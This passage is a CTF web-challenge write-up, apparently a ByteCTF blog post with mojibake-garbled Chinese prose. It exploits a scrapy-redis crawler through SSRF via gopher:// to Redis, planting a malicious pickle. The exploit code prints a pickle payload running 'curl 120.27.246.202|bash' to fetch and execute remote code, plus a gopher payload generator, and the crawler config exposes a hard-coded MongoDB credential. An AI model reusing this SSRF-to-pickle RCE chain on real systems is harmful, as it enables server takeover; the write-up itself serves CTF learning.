MONGODB_HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">        MONGODB_PORT = <span class="number">27017</span></span><br><span class="line">        MONGODB_DBNAME = <span class="string">'result'</span></span><br><span class="line">        MONGODB_TABLE = <span class="string">'result'</span></span><br><span class="line">        MONGODB_USER = <span class="string">'N0rth3'</span></span><br><span class="line">        MONGODB_PASSWD = <span class="string">'E7B70D0456DAD39E22735E0AC64A69AD'</span></span><br><span class="line">        mongo_client = pymongo.MongoClient(<span class="string">"%s:%d"</span> % (MONGODB_HOST, MONGODB_PORT))</span><br><span class="line">        mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)</span><br><span class="line">        mongo_db = mongo_client[MONGODB_DBNAME]</span><br><span class="line">        self.table = mongo_db[MONGODB_TABLE]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span><span class="params">(self, item, spider)</span>:</span></span><br><span class="line"></span><br><span class="line">        quote_info = dict(item)</span><br><span class="line">        print(quote_info)</span><br><span class="line">        self.table.insert(quote_info)</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//settings.py</span><br><span class="line">BOT_NAME = <span class="string">'bytectf'</span></span><br><span class="line">SPIDER_MODULES = [<span class="string">'bytectf.spiders'</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">'bytectf.spiders'</span></span><br><span class="line">RETRY_ENABLED = <span class="literal">False</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line">DOWNLOAD_TIMEOUT = <span class="number">8</span></span><br><span class="line">USER_AGENT = <span class="string">'scrapy_redis'</span></span><br><span class="line">SCHEDULER = <span class="string">"scrapy_redis.scheduler.Scheduler"</span></span><br><span class="line">DUPEFILTER_CLASS = <span class="string">"scrapy_redis.dupefilter.RFPDupeFilter"</span></span><br><span class="line">REDIS_HOST = <span class="string">'172.20.0.7'</span></span><br><span class="line">REDIS_PORT = <span class="number">6379</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line"> <span class="string">'bytectf.pipelines.BytectfPipeline'</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥åŠä¸»è¦çš„çˆ¬è™«é€»è¾‘ã€‚çŸ¥é“äº†æ–‡ä»¶è¯»å–çš„æ¼æ´æ‰€åœ¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisSpider</span><br><span class="line"><span class="keyword">from</span> bytectf.items <span class="keyword">import</span> BytectfItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ByteSpider</span><span class="params">(RedisSpider)</span>:</span></span><br><span class="line">    name = <span class="string">'byte'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        byte_item = BytectfItem()</span><br><span class="line">        byte_item[<span class="string">'byte_start'</span>] = response.request.url</span><br><span class="line">        url_list = []</span><br><span class="line">        test = response.xpath(<span class="string">'//a/@href'</span>).getall()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">'/'</span>:</span><br><span class="line">                url = response.request.url + i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = i</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r'://'</span>,url):</span><br><span class="line">                r = scrapy.Request(url,callback=self.parse2,dont_filter=<span class="literal">True</span>)</span><br><span class="line">                r.meta[<span class="string">'item'</span>] = byte_item</span><br><span class="line">                <span class="keyword">yield</span> r</span><br><span class="line">            url_list.append(url)</span><br><span class="line">            <span class="keyword">if</span>(len(url_list)&gt;<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        byte_item[<span class="string">'byte_url'</span>] = response.request.url</span><br><span class="line">        byte_item[<span class="string">'byte_text'</span>] = base64.b64encode((response.text).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        <span class="keyword">yield</span> byte_item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse2</span><span class="params">(self,response)</span>:</span></span><br><span class="line">        item = response.meta[<span class="string">'item'</span>]</span><br><span class="line">        item[<span class="string">'byte_url'</span>] = response.request.url</span><br><span class="line">        item[<span class="string">'byte_text'</span>] = base64.b64encode((response.text).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure><p>å¯æ˜¯è¿™æœ‰ä»€ä¹ˆç”¨å‘¢â€¦â€¦æˆ‘ä»¬ä¸€æ ·ä¸çŸ¥é“flagåœ¨å“ªã€‚ç›®å‰çœ‹æ¥,å¦‚æœflagåœ¨botæœºå™¨ä¸Š,é‚£ä¹ˆåªæœ‰å¯èƒ½ä¼šæ˜¯æ‰“redisã€‚å¹¶ä¸”æŒ‰ç…§æˆ‘è‡ªå·±çš„å°‘æ•°ç»éªŒï¼Œä¸€èˆ¬æ˜¯æ­é…pickleååºåˆ—åŒ–rceæ‰æœ‰å¯èƒ½ã€‚ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰æ˜æ˜¾çš„pickleååºåˆ—åŒ–ä»£ç ã€‚</p><p>æ­¤æ—¶é™·å…¥åƒµå±€ï¼Œåªæœ‰æœ¬åœ°è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰æ„å¤–å‘ç”Ÿäº†ã€‚</p><h2 id="Run-it-locally"><a href="#Run-it-locally" class="headerlink" title="Run it locally"></a>Run it locally</h2><p>è¿™é“é¢˜æœ€é‡è¦çš„ä¸€ç‚¹ææ€•å°±æ˜¯æœ¬åœ°è·‘äº†ã€‚æ¯•ç«Ÿæ­¤æ—¶æˆ‘ä»¬å¯¹ç¯å¢ƒä¸€æ— æ‰€çŸ¥,æˆ‘å”¯ä¸€èƒ½æƒ³åˆ°çš„getshellæ–¹æ³•ä¹Ÿåªæœ‰pickleååºåˆ—åŒ–äº†ã€‚é‚£ä¹ˆè¯•è¯•æœ¬åœ°ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰é”®å­˜äº†pickleåºåˆ—åŒ–åçš„æ•°æ®ï¼Ÿè¿™æ ·ä¸€æ¥å¿…ç„¶æœ‰æŸä¸ªåœ°æ–¹å­˜åœ¨ååºåˆ—åŒ–ã€‚</p><p>ç»è¿‡ä¸€ç•ªæŠ˜è…¾åã€‚æˆ‘ç®€å•å†™äº†ä¸ªèµ·mongodbçš„docker.å› ä¸ºredisè·Ÿçˆ¬è™«æœ¬åœ°èµ·æ¯”è¾ƒè½»æ¾,æˆ‘åˆä¸æƒ³æ”¹ä»£ç ã€‚<br>(åé¢æ¯”èµ›ç»“æŸæ—¶å†™äº†ä¸ªå®Œæ•´ç‰ˆçš„,ç›´æ¥èµ·åº”è¯¥è·Ÿçº¿ä¸Šçš„bot+redis+mongoç¯å¢ƒåŸºæœ¬ä¸€è‡´äº†)<br>docker-compose.yml</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">mongodb:</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">mongo:4.2</span></span><br><span class="line">      <span class="attr">container_name:</span> <span class="string">py_db</span></span><br><span class="line">      <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">      <span class="attr">environment:</span></span><br><span class="line">        <span class="attr">MONGO_INITDB_ROOT_USERNAME:</span> <span class="string">root</span></span><br><span class="line">        <span class="attr">MONGO_INITDB_ROOT_PASSWORD:</span> <span class="string">root</span> </span><br><span class="line">        <span class="attr">MONGO_INITDB_DATABASE:</span> <span class="string">result</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">./mongo-init.js:/docker-entrypoint-initdb.d/mongo-init.js:ro</span></span><br></pre></td></tr></table></figure><p>åŒç›®å½•ä¸‹mongo-init.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data=&#123;<span class="string">"test"</span>:<span class="string">"123"</span>&#125;<span class="comment">//just for test</span></span><br><span class="line">db.result.drop();</span><br><span class="line">db.result.insert(data);</span><br><span class="line">db.createUser(&#123;</span><br><span class="line">    user: <span class="string">"N0rth3"</span>,</span><br><span class="line">    pwd:  <span class="string">"E7B70D0456DAD39E22735E0AC64A69AD"</span>,</span><br><span class="line">    roles: [ &#123; <span class="attr">role</span>: <span class="string">"readWrite"</span>, <span class="attr">db</span>: <span class="string">"result"</span>, <span class="attr">collection</span>:<span class="string">"result"</span> &#125;]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ç®€å•æ”¹ä¸‹çˆ¬è™«çš„redis/mongodb ip ,å°±èƒ½å¼€è·‘äº†</p><p><img src="https://i.imgur.com/znmnKI4.png" class="lazyload" data-srcset="https://i.imgur.com/znmnKI4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç„¶åæ­¤æ—¶æˆ‘å‘ç°ä¸€ç‚¹åŠ¨é™çš„éƒ½æ²¡æœ‰ã€‚æ„Ÿè§‰éå¸¸å¥‡æ€ªã€‚å€’æ˜¯çœ‹åˆ°scrapyå®ƒåœ¨å‡†å¤‡è¯»<code>byte:start_urls</code></p><p>æ—¢ç„¶å¦‚æ­¤é‚£<code>set xx xxx</code>è¯•è¯•çœ‹å¥½äº†ã€‚ç»“æœçªç„¶å‘ç°çˆ¬è™«ç›´æ¥å¼‚å¸¸é€€å‡ºï¼Ÿ</p><p>çœ‹äº†ä¸‹æŠ¥é”™ã€‚ä¼¼ä¹æ˜¯åœ¨æ‰§è¡Œredisçš„LPOPæ“ä½œæŠ¥é”™çš„ã€‚é‚£å¯èƒ½æ˜¯æ•°æ®ç±»å‹çš„é—®é¢˜äº†ã€‚æ‰¾äº†ä¸‹ä¸€ç¯‡æ–‡ç« å‘ç°äº†åŸå› ã€‚</p><p><a href="https://blog.csdn.net/zwq912318834/article/details/78854571" target="_blank" rel="noopener">https://blog.csdn.net/zwq912318834/article/details/78854571</a><br>å®ƒçˆ¬è™«çš„é€»è¾‘è·Ÿæˆ‘ä»¬çš„åŸºæœ¬ä¸€è‡´ã€‚å±äºåˆ†å¸ƒå¼çˆ¬è™«ã€‚å³ç­‰å¾…redisä¸­å‡ºç°redis_keyå†è¿›è¡Œçˆ¬å–ã€‚<br>è€Œè¿™é‡Œå› ä¸ºä¸æ˜¯ç®€å•çš„ä»å­—ç¬¦ä¸²è¿›è¡Œè¯»å–ï¼Œè€Œæ˜¯ä»ä¸€ä¸ªé˜Ÿåˆ—é‡Œè¯»ä¸€ä¸ªå…ƒç´ ã€‚é‚£ä¹ˆè‡ªç„¶ä¸ä¼šè¯»åˆ°å†…å®¹äº†ã€‚</p><p>æœŸé—´,è½¬æˆ˜è™šæ‹Ÿæœºèµ·æœåŠ¡ã€‚è¿™ä¸€æ¬¡æˆ‘ä»¬ç”¨è„šæœ¬å†™å…¥æ•°æ®ã€‚å…¶å®å°±æ˜¯æ‰§è¡Œlpushè€Œå·²ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line">redis_Host = <span class="string">"127.0.0.1"</span></span><br><span class="line">redis_key = <span class="string">'byte:start_urls'</span></span><br><span class="line">rediscli = redis.Redis(host = redis_Host, port = <span class="number">6379</span>, db = <span class="string">"0"</span>)</span><br><span class="line">rediscli.lpush(redis_key, <span class="string">"http://www.baidu.com"</span>)</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å°±å¯ä»¥æˆåŠŸå†™å…¥,çˆ¬å–æ•°æ®ï¼Œå¹¶å°†æ•°æ®å­˜è¿›mongodbã€‚<br>è¿™é‡Œæˆ‘å†å°è¯•æ‰“ä¸€éredisè·Ÿmongodbã€‚å‘ç°è·ŸæœåŠ¡ç«¯è¿œç¨‹æ˜¯ä¸€è‡´çš„ã€‚æ‰“redisä¼šæå‰æŠ¥é”™ç»ˆæ­¢ï¼Œæ‰“mongodbä¼šæœ‰å›æ˜¾<br><img src="https://i.imgur.com/t0i6Z1n.png" class="lazyload" data-srcset="https://i.imgur.com/t0i6Z1n.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p><img src="https://i.imgur.com/0Py191w.png" class="lazyload" data-srcset="https://i.imgur.com/0Py191w.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä¸è¿‡è¿™é‡Œrediså› ä¸ºlpopè¿™ä¸ªæ“ä½œã€‚å¯¼è‡´æˆ‘å†™å…¥çš„è¿™ä¸ªlistå¾ˆå¿«å°±ä¼šæ¶ˆå¤±ã€‚å®ƒå­˜çš„ä¹Ÿä¸æ˜¯pickleæ•°æ®ã€‚é‚£ä¹ˆè¦æ€ä¹ˆrce?æ­¤æ—¶å†åº¦é™·å…¥åƒµå±€</p><p>æ­¤æ—¶å®˜æ–¹æ”¾å‡ºç¬¬ä¸‰ä¸ªhint scrapy_redis,é¢˜ç›®ä»æ˜¯0è§£ã€‚æˆ‘å¼€å§‹æƒ³scrapy_redisæˆ‘ç¬¬ä¸€å¤©ä¸Šåˆå°±å‘ç°äº†è¿˜éœ€è¦æç¤ºï¼Ÿä½†æ˜¯è½¬å¿µæƒ³ä¼šä¸ä¼šæˆ‘æƒ³è¦çš„pickleæ“ä½œå­˜åœ¨äºscrapy_rediså‘¢ï¼Ÿ</p><p><a href="https://github.com/rmax/scrapy-redis" target="_blank" rel="noopener">https://github.com/rmax/scrapy-redis</a></p><p>äºæ˜¯ã€‚æˆ‘ç”¨scrapy-redis githubä¸Šçš„example-projectè·‘äº†éã€‚è¿™ä¸ªdemoæ˜¯æŒ‡å®šäº†urlä¸€ç›´åœ¨çˆ¬çš„ã€‚äºæ˜¯å½“æˆ‘è¿è¿›redisæ—¶ï¼Œæˆ‘å‘ç°äº†3ä¸ªé”®ã€‚å¹¶ä¸”å½“æˆ‘æŸ¥çœ‹ä»–ä»¬çš„æ—¶å€™,ç»ˆäºå‘ç°äº†å¿ƒå¿ƒå¿µå¿µçš„å†…å®¹ä¹Ÿå°±æ˜¯pickleçš„åºåˆ—åŒ–æ•°æ®ã€‚<br><img src="https://i.imgur.com/CwJ70OW.png" class="lazyload" data-srcset="https://i.imgur.com/CwJ70OW.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ—¢ç„¶å­˜åœ¨pickleåºåˆ—åŒ–çš„æ•°æ®ã€‚é‚£ä¹ˆå¿…ç„¶æŸä¸ªåœ°æ–¹ä¼šååºåˆ—åŒ–å®ƒã€‚è¿™æ ·ä¸€æ¥rceçš„é“¾æ¡ç«‹é©¬å°±æ¸…æ¥šäº†ã€‚è®¾ç½®é”® -&gt; pickle rce è·Ÿpwnhub6æœˆèµ›å·®ä¸å¤šäº†ã€‚</p><p>ä½†æ˜¯æœ¬åœ°ä¸ºä»€ä¹ˆæ²¡æœ‰<code>byte:requests</code>å‡ºç°å‘¢ï¼Ÿæˆ‘æ€€ç–‘æ˜¯å› ä¸ºæ¯æ¬¡åªä¼ å…¥ä¸€ä¸ªurlã€‚å¯¼è‡´å­˜æ´»æ—¶é—´æçŸ­ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¸å¦¨ç”¨å¤§é‡æ•°æ®å¡«å……è¿›redisã€‚æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œä¸Šé¢çš„è„šæœ¬åŠ ä¸ªforå¾ªç¯200æ¬¡å°±å¥½äº†ã€‚ç„¶åæˆ‘ä»¬åœ¨redisé‡Œæ‰§è¡Œå‡ æ¬¡çœ‹çœ‹<code>zrange byte:requests 0 1</code><br><img src="https://i.imgur.com/hkiEKsi.png" class="lazyload" data-srcset="https://i.imgur.com/hkiEKsi.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ—¢ç„¶å¦‚æ­¤ã€‚åˆ©ç”¨é“¾å°±æ¸…æ¥šäº†ï¼šæƒ³åŠæ³•å†™å…¥<code>byte:requests</code>é”®ï¼Œå†…å®¹ä¸ºåºåˆ—åŒ–æ•°æ®ã€‚<br>è€Œå†™å…¥é”®å”¯æœ‰pycurlçš„ssrfå¯ä»¥åšåˆ°ã€‚</p><p>ä¸‹é¢å°±æ˜¯åˆ©ç”¨äº†</p><h2 id="ssrf-gt-rce-exploit"><a href="#ssrf-gt-rce-exploit" class="headerlink" title="ssrf -&gt; rce exploit"></a>ssrf -&gt; rce exploit</h2><p>è¿™é‡Œæˆ‘ä»¬é¦–å…ˆå°è¯•ä¸€ä¸‹ç›´æ¥å†™å…¥byte:requestsä¼šæ€ä¹ˆæ ·ã€‚ç„¶åæƒŠå–œçš„å‘ç°åªè¦å†™å…¥å°±ä¼šç›´æ¥è§¦å‘ååºåˆ—åŒ–ã€‚é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ç›´æ¥åˆ©ç”¨<code>/result?url</code>å°±å¯ä»¥æ‰“äº†ã€‚</p><p>ç„¶åæ¨æµ‹ä¸€æ³¢ç‰ˆæœ¬ï¼Œè¿™é‡Œæˆ‘æ‰“è¿œç¨‹ç”¨çš„protocolåè®®ä¸º2.0çš„pickleæˆåŠŸäº†ã€‚å½“æ—¶getshellæ²¡çœ‹pythonç‰ˆæœ¬,ä¼°è®¡æ˜¯2.7.(scrapy ä¸€èˆ¬åœ¨2.7 æˆ–3.5/3.6è·‘)</p><p>ä¸€ä¸ªæ¯”è¾ƒå¤´ç–¼çš„ç‚¹æ˜¯å¦‚ä½•å†™å…¥opcodeçš„16è¿›åˆ¶æ•°æ®ã€‚ä¹‹å‰pwnhub6æœˆèµ›æ—¶å†™pickleæ•°æ®æ˜¯å› ä¸ºcrlfæ¯”è¾ƒç®€å•ã€‚å¯ä»¥ç›´æ¥åŠ ä¸ªå¼•å·æ‹¬èµ·æ¥å†™ã€‚è¿™é‡Œæˆ‘ä»¬åªèƒ½gopheræ‰“ã€‚é‚£ä¹ˆè½¬æ•°æ®æ—¶å‡ºäº†ä¸å°‘éº»çƒ¦ã€‚æœ€åæˆ‘ç®€å•æ”¹äº†ä¸‹redis-ssrfè¿™ä¸ªè„šæœ¬çš„å†…å®¹ã€‚ç”¨python2 è·‘ã€‚ç¡®è®¤å®ƒä¸ä¼šåƒpython3é‚£æ ·è‡ªåŠ¨è½¬ä¹‰æˆ‘çš„16è¿›åˆ¶å­—ç¬¦ä¸²ã€‚ç»ˆäºæ„é€ å‡ºå¯ä»¥æ‰“çš„payload</p><p>python3 è¿è¡Œä»¥å¾—åˆ°pickle 16è¿›åˆ¶åºåˆ—åŒ–æ•°æ®ã€‚py2çš„ç›´æ¥å†™è²Œä¼¼æœ‰ç‚¹é—®é¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""curl 120.27.246.202|bash"""</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e,protocol=<span class="number">2</span>)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><p>python2 è¿è¡Œ convert.py<br>æ³¨æ„æˆ‘ä»¬æ‰§è¡Œçš„æ˜¯zaddã€‚å› ä¸ºä¹‹å‰æœ¬åœ°å·²ç»çŸ¥é“äº†requestsæ˜¯zsetç±»å‹æ•°æ®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_key</span><span class="params">(key,payload)</span>:</span></span><br><span class="line">    cmd=[</span><br><span class="line">    <span class="string">"zadd &#123;0&#125; 1 &#123;1&#125;"</span>.format(key,payload),</span><br><span class="line">    <span class="string">"quit"</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x)))+CRLF+x</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_payload</span><span class="params">()</span>:</span></span><br><span class="line">    key = <span class="string">"byte:requests"</span></span><br><span class="line">    payload =<span class="string">"""\x80\x02cposix\nsystem\nq\x00X\x18\x00\x00\x00curl 120.27.246.202|bashq\x01\x85q\x02Rq\x03."""</span>.replace(<span class="string">' '</span>,<span class="string">'\x12'</span>)</span><br><span class="line">    cmd=set_key(key,payload)</span><br><span class="line">    protocol=<span class="string">"gopher://"</span></span><br><span class="line"></span><br><span class="line">    ip=<span class="string">"172.20.0.7"</span></span><br><span class="line">    port=<span class="string">"6379"</span></span><br><span class="line"></span><br><span class="line">    payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += quote(redis_format(x).replace(<span class="string">"^"</span>,<span class="string">" "</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    passwd = <span class="string">''</span></span><br><span class="line">    p=generate_payload()</span><br><span class="line">    print(p.replace(<span class="string">'%12'</span>,<span class="string">'%20'</span>))</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªå°å‘æ˜¯æˆ‘çš„ç©ºæ ¼æ€»æ˜¯ä¼šè¢«é”™è½¬ã€‚äºæ˜¯å¹²è„†å…ˆæŠŠç©ºæ ¼å¡«å……ä¸€ä¸‹æœ€åå†æ¢å›<code>%20</code>å³å¯ã€‚</p><p>æ‰“æœ¬åœ°æˆäº†åï¼Œè¿œç¨‹å¿…ç„¶æ²¡æœ‰é—®é¢˜äº†ã€‚<br>æœ€åå› ä¸ºgetä¼ å‚,æˆ‘ä»¬æ³¨æ„äºŒæ¬¡urlç¼–ç å³å¯ã€‚æ‰§è¡Œå‘½ä»¤<code>curl xxx|bash</code><br>(è¯»æ–‡ä»¶ç¡®è®¤æœ‰bash,pycurlç¡®è®¤æœ‰curl,åŒæ—¶ä¹‹å‰æŠŠå‘½ä»¤å¾€tmpä¸‹å†™æ—¶å‘ç°æœ‰readflag)</p><p>getshell :)<br><img src="https://i.imgur.com/7afkg9s.png" class="lazyload" data-srcset="https://i.imgur.com/7afkg9s.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>  